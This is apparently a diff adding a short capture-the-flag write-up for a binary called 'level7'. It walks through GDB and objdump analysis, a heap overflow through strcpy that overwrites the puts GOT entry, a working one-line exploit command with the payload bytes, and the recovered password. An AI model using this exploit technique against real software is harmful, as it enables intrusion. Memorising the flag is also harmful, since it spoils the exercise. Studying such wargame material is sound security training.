@@ -1,0 +1,21 @@
+Step 1: Analyze binary with GDB
+$ gdb ./level7
+(gdb) info functions        # Found m(), main()
+(gdb) disassemble m         # Found printf() that prints global buffer
+(gdb) disassemble main      # Found heap allocation and strcpy()
+
+Step 2: Understand the vulnerability
+- Two heap structures with pointers
+- strcpy(argv[1]) can overflow to control struct2->ptr
+- strcpy(argv[2]) writes to controlled location
+- Program reads password into global buffer but doesn't print it normally
+
+Step 3: Find GOT entry to overwrite
+$ objdump -R level7
+Found puts@GOT at 0x08049928
+
+Step 4: Create exploit
+$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+Step 5: Got password directly
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
